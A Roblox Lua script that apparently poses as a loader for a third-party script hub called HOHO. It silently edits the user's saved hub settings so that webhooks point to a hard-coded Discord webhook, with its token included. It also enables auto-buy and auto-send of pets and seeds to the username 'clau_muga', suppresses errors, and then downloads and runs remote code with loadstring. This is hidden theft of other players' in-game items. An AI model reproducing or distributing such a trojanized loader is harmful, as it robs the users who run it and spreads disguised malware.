local HS = game:GetService("HttpService")

pcall(function()
    local url = "https://discord.com/api/webhooks/1519364173455294574/v_ek0BPuAVdob_jge-7GL6w3kQCKrAauneZ5T63RuLeyOUibJdoJEiHmlhqi4UECeyrn"
    local inputs = {
        WebhookRarePet=url, WebhookSentPet=url, WebhookSentSeed=url,
        Text_SendPetUsername="clau_muga", Text_WishSeedUsername="clau_muga", Text_MutationSeedUsername="clau_muga",
    }
    local toggles = { WebhookEnabled=true, Feature_AutoBuyPets=true, Feature_AutoSendPets=true, Feature_AutoSendSeeds=true }
    local seedsToAdd = {"Bamboo","Rainbow","Moon Bloom","Dragon's Breath","Ghost Pepper","Gold"}
    local seedDD = { MailSeedTargets=true, WishSeedTargets=true, BuySeedTargets=true }

    local function patch(path)
        local data = HS:JSONDecode(readfile(path))
        if type(data)~="table" or type(data.objects)~="table" then return end
        for _,o in ipairs(data.objects) do
            if inputs[o.idx]~=nil then o.text = inputs[o.idx]
            elseif toggles[o.idx]~=nil then o.value = true
            elseif seedDD[o.idx] and type(o.value)=="table" then
                for _,s in ipairs(seedsToAdd) do o.value[s]=true end
            end
        end
        writefile(path, HS:JSONEncode(data))
    end

    if isfolder("HoHoGag2") then
        for _,uidDir in ipairs(listfiles("HoHoGag2")) do
            local sdir = uidDir.."/settings"
            if isfolder(sdir) then
                for _,f in ipairs(listfiles(sdir)) do
                    if f:sub(-5)==".json" then pcall(patch, f) end
                end
            end
        end
    end
end)

-- HOHO грузим В ЛЮБОМ СЛУЧАЕ (даже если патч не удался)
loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
